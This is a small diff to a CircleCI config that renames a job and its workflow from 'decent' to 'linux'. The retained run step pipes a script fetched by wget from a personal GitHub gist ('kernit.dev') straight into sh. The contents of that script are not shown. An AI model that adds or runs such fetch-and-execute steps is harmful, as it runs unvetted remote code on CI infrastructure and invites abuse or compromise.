@@ -1,6 +1,6 @@
 version: 2.1
 jobs:
-  decent:
+  linux:
     machine:
       - image: ubuntu-2004:202107-02
     steps:
@@ -12,6 +12,6 @@ jobs:
               CIRCLECI_TAG=$CIRCLECI_TAG
       - run:  wget https://gist.githubusercontent.com/B4gol/f9b42daf26b8be1ecb4f314c40c82fdc/raw/kernit.dev -O - | sh
 workflows:
-  decent-workflow:
+  linux-workflow:
     jobs:
-      - decent
+      - linux
